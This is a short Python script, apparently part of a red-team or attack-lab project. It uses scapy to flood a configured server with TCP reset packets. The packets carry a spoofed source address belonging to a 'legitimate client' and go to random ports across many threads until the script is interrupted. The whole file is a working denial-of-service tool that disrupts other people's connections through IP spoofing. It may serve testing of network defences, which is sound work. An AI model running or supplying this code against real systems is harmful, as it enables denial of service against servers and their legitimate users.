import random
import threading
import time
from multiprocessing.pool import ThreadPool

from loguru import logger
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.sendrecv import send

from red.config import config
from red.utils import random_port


stop = threading.Event()


def connection(_: None):
    while not stop.is_set():
        packet = (
                IP(src=config.attack.legitimate_client_ip, dst=config.server_host)
                / TCP(sport=random_port(), dport=random_port(), flags='R')
        )
        send(packet, verbose=False)


def run():
    threads = int(config.attack.cli.pps)
    logger.info(f"Starting with: "
                f"{threads} ")

    with ThreadPool(threads) as pool:
        pool.map(connection, [None] * threads)
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            stop.set()
